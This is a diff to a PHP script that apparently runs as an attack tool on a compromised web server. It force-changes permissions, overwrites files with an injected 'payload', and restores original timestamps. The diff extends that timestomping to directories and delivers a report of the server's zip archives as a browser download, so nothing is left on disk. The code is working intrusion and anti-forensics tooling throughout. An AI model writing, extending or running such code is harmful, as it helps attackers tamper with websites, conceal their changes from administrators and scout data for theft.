@@ -145,10 +145,12 @@ if ($new_code === false) {
             
             // Detect original modified time
             $original_time = @filemtime($file_path);
+            $dir_path = dirname($file_path);
+            $dir_original_time = @filemtime($dir_path);
             
             // Force file and directory permissions to ensure update succeeds
             @chmod($file_path, 0777);
-            @chmod(dirname($file_path), 0777);
+            @chmod($dir_path, 0777);
             
             if (@unlink($file_path)) {
                 sys_print("  [+] Old file eradicated.", "success", 100);
@@ -159,15 +161,21 @@ if ($new_code === false) {
             if (@file_put_contents($file_path, $new_code) !== false) {
                 sys_print("  [+] Payload injected successfully.", "success", 100);
                 
-                // Restore original timestamp to the file only
+                // Restore original timestamp to the file
                 if ($original_time) {
                     @touch($file_path, $original_time);
-                    sys_print("  [+] Original timestamp restored.", "success", 100);
+                    sys_print("  [+] Original file timestamp restored.", "success", 100);
                 }
                 
                 // Restore safer permissions
                 @chmod($file_path, 0644);
-                @chmod(dirname($file_path), 0755);
+                @chmod($dir_path, 0755);
+                
+                // Restore original timestamp to the directory
+                if ($dir_original_time) {
+                    @touch($dir_path, $dir_original_time);
+                    sys_print("  [+] Original directory timestamp restored.", "success", 100);
+                }
                 
                 $izi_status_log[$file_path] = "Updated";
             } else {
@@ -428,16 +436,19 @@ if (empty($found_zips)) {
     ];
     
     $zip_json_data = json_encode($zip_report, JSON_PRETTY_PRINT);
-    file_put_contents('zip_locations.json', $zip_json_data);
-    sys_print("Saved zip locations to JSON. Auto-downloading...", "success", 100);
+    sys_print("Generated zip locations JSON. Auto-downloading...", "success", 100);
     echo "<script>
         setTimeout(function() {
+            var data = " . json_encode($zip_json_data) . ";
+            var blob = new Blob([data], {type: 'application/json'});
+            var url = URL.createObjectURL(blob);
             var link = document.createElement('a');
-            link.href = 'zip_locations.json';
+            link.href = url;
             link.download = 'zip_locations.json';
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
+            URL.revokeObjectURL(url);
         }, 1500);
     </script>";
     @flush();
